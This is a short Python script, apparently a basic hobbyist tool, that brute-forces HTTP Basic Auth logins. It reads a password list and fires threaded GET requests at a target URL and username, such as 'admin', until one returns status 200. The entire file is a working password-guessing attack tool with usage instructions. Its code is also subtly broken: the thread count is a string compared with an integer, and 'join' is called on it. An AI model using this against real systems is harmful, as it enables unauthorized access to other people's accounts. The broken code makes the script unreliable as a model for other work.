#!/usr/bin/python

import requests
from threading import Thread
import sys
import getopt

global hit
hit = "1" 

class request_performer(Thread):
    def __init__(self, name, user, url):
        Thread.__init__(self)
        self.password = name.split("\n")[0]
        self.user = user
        self.url = url
        print(f"- {self.password} -")
    def run(self):
        global hit 
        if hit == "1":
            try:
                r = requests.get(self.url, auth=(self.user, self.password))
                if r.status_code == 200:
                    hit = "0"
                    print(f"[+] Password Found - {self.password}")
                    sys.exit()
                else:
                    print(f"[!!] - {self.password} Is not Valid")
                    i[0] = i[0] - 1
            except Exception as e:
                print(e)



def banner ():
    print(f"#########################")
    print(f"* Our Basic Bruteforcer *")
    print(f"#########################")

def usage():
    print("Usage:")
    print("     -w: url (http://somesite.com)")
    print("     -u: username")
    print("     -t: threads")
    print("     -f: password list")
    print("Example: ./broteforcer.py -w http://somesite.com -u admin -t 5 -f passwd.txt")


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:t:")
    except getopt.GetoptError:
        print(f"Error on arguements")
        sys.exit()
    for opt,arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            passlist = arg
        elif opt == '-t':
            threads = arg
    try:
        f = open(passlist, "r")
        passwords = f.readlines()
    except:
        print(f"[!!]Cant open that file")
        sys.exit()
    launcher_thread(passwords, threads, user, url)

def launcher_thread(passwords, threads, user, url):
    global i 
    i = []
    i.append(0)
    while len(passwords):
        if hit == "1":
            try:
                if i[0] < threads:
                    passwd = passwords.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(passwd, user, url)
                    thread.start()
            except KeyboardInterrupt:
                print(f"[!!]Interrupted")
                sys.exit()
            threads.join()
            

    



if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print(f"[!!]Interrupted")